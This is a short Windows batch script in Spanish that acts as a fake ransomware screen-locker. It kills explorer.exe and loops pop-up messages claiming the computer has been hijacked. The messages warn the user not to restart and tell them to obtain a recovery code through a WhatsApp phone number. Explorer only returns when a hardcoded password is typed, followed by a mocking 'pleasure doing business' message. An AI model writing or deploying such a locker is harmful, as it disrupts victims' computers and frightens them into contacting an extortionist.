@echo off
taskkill /f /im explorer.exe
:falso
msg * Su computadora fue secuestrada
msg * no reinicie o PERDERA TODO...
msg * solicite su codigo al WhatsApp 3054237887
echo ============================================
echo NO APAGUE LA COMPUTADORA
echo ============================================
echo ingrese su codigo
set /p pass=Escriba el codigo de recuperacion
if %pass%==Cabanzin (goto correcto) else (goto falso)
:correcto
start explorer.exe
msg * fue un placer negociar con usted.
exit